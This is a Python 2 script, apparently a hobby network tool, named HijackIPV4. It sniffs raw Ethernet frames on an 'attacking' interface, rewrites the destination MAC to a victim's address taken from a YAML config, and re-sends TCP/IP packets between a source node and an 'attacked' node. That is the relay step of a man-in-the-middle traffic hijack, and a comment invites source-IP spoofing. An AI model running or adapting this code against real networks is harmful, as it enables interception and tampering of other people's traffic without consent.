#self.packet sniffer in python for Linux
#Sniffs only incoming TCP self.packet
import binascii
import socket, sys, logging

import yaml
import io

from node import node
from utils import  toHex, ListToString, formatMAC
from struct import *

#globals
g_debug=False
g_atacking_interface = ''
g_atacked_mac = ''

# CONSTANTS 
c_AllPorts = 65565
c_macSize = 6

def debug_print(string):
    if(g_debug):
        print(string)

class HijackIPV4:

    src_mac = ''
    dst_mac = ''
    source_port = '' 
    dest_port = ''
    sequence = ''
    acknowledgement = ''
    doff_reserved = ''
    tcph_length = ''
    packet = ''
    packetFull = ''
    s_addr = ''
    d_addr = ''

    def __init__(self):
        #create an INET, STREAMing socket
        try:
            self.s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            self.s.bind((g_atacking_interface,0))
            #self.sendingSocker = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error , msg:
            print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
            sys.exit()
 
    def receive(self):
        self.packetFull = self.s.recvfrom(c_AllPorts)

        #self.packet string from tuple
        self.packet = self.packetFull[0]
        self.eth_header = self.translateEthernet()
        self.translateIP()
        self.translateTCP()
        

    def sendto(self):
        p = self.eth_header + self.ip_header + self.packet[self.iph_length:self.iph_length+20] \
        + self.packet[self.iph_length+20:len(self.packet)]
        self.s.send(p)

    def translateEthernet(self):
        ethernet_header = self.packet[0:14]
        eth = unpack('!6s6sH' , ethernet_header)
         
        
        self.dst_mac = toHex(ethernet_header[0:6].decode("latin1"))
        self.src_mac = toHex(ethernet_header[6:12].decode("latin1"))

        #print stringToHex(self.src_mac)
        #print self.dst_mac
        string_print =  'Source MAC-Address : ' + str(self.src_mac)\
        + ' Destination MAC-Address : ' + str(self.dst_mac)
        debug_print(string_print) 

        # nao seria o src_mac?
        #print sys.argv[3]

        #print 'hex value:' + ':'.join(hex(ord(x))[2:] for x in sys.argv[3])
        dst_mac = binascii.unhexlify(g_atacked_mac) # to raw binary sys.argv[3]#funcao q transforma agv[3] em hex
        print self.dst_mac
        
        return pack('!6s6sH', dst_mac,  binascii.unhexlify(self.src_mac), eth[2])
        
    def translateIP(self):
        ## TRANSLATE RECEIVED IP ###
        #take first 20 characters for the ip header
        ip_header = self.packet[14:34]

        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s' , ip_header)

        version_ihl = iph[0]
        version = version_ihl >> 4
        ihl = version_ihl & 0xF

        self.iph_length = ihl * 4

        ttl = iph[5]
        protocol = iph[6]
        self.s_addr = socket.inet_ntoa(iph[8]);
        self.d_addr = socket.inet_ntoa(iph[9]);

        string_print = 'Version : ' + str(version) + ' IP Header Length : ' + str(ihl) + ' TTL : '\
        + str(ttl) + ' Protocol : ' + str(protocol) + ' Source Address : ' + str(self.s_addr)\
        + ' Destination Address : ' + str(self.d_addr)
        debug_print(string_print) 

        ## GENERATE THE IP HEADER ##
        # now start constructing the packet
        source_ip = self.s_addr
        dest_ip = self.d_addr # or socket.gethostbyname('www.google.com')
         
        # ip header fields
        ip_ihl = ihl
        ip_ver = version
        ip_tos = 0
        ip_tot_len = 0  # kernel will fill the correct total length
        ip_id = 54321   #Id of this packet
        ip_frag_off = 0
        ip_ttl = ttl
        ip_proto = protocol
        ip_check = 0    # kernel will fill the correct checksum
        ip_saddr = socket.inet_aton ( source_ip )   #Spoof the source ip address if you want to
        ip_daddr = socket.inet_aton ( dest_ip )
         
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
         
        # the ! in the pack format string means network order
        self.ip_header = pack('!BBHHHBBH4s4s' , ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        ### end of generation ###

    def translateTCP(self):

        tcp_header = self.packet[self.iph_length:self.iph_length+20]

        #now unpack them :)
        tcph = unpack('!HHLLBBHHH' , tcp_header)

        self.source_port = tcph[0]
        self.dest_port = tcph[1]
        self.sequence = tcph[2]
        self.acknowledgement = tcph[3]
        self.doff_reserved = tcph[4]
        self.tcph_length = self.doff_reserved >> 4

        debug_print ("%s" %('Source Port : ' + str(self.source_port) + ' Dest Port : ' + str(self.dest_port)\
        + ' Sequence Number : ' + str(self.sequence) + ' Acknowledgement : '\
        + str(self.acknowledgement) + ' TCP header length : ' + str(self.tcph_length))) 

        h_size = self.iph_length + self.tcph_length * 4
        data_size = len(self.packet) - h_size

        #get data from the self.packet
        data = self.packet[h_size:]

        debug_print("%s"%'Data : ' + data +'\n') 

        # tcp header fields
        tcp_source = tcph[0]   # source port
        tcp_dest = tcph[1]   # destination port
        tcp_seq = tcph[2]
        tcp_ack_seq = tcph[3]
        tcp_doff = tcph[4]    #4 bit field, size of tcp header, 5 * 4 = 20 bytes
        #tcp flags
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons (5840)    #   maximum allowed window size
        tcp_check = 0
        tcp_urg_ptr = 0
         
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh <<3) + (tcp_ack << 4) + (tcp_urg << 5)
         
        # the ! in the pack format string means network order
        #tcp_header = pack('!HHLLBBHHH' , tcp_source, tcp_dest, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags,  tcp_window, tcp_check, tcp_urg_ptr)
         


        if self.d_addr == Atacked_node.ip:
            print 'Resending to atacked node'
            self.sendto()
        elif self.d_addr == Src_node.ip:
            print 'Resending to src node'
            self.sendto()

#open config
with open("config.yaml", 'r') as stream:
    data_loaded = yaml.load(stream)

if(data_loaded['mode'] == 'debug'):
    g_debug=True
else:
    g_debug=False

g_atacking_interface = data_loaded['atacking_node']['interface']
g_atacked_mac = data_loaded['dst_node']['mac']

Atacked_node = node(data_loaded['dst_node']['name'], data_loaded['dst_node']['ip'], data_loaded['dst_node']['mac'])
Src_node = node(data_loaded['src_node']['name'], data_loaded['src_node']['ip'], data_loaded['src_node']['mac'])
hijack = HijackIPV4()
# receive a self.packet
while True:
    hijack.receive()

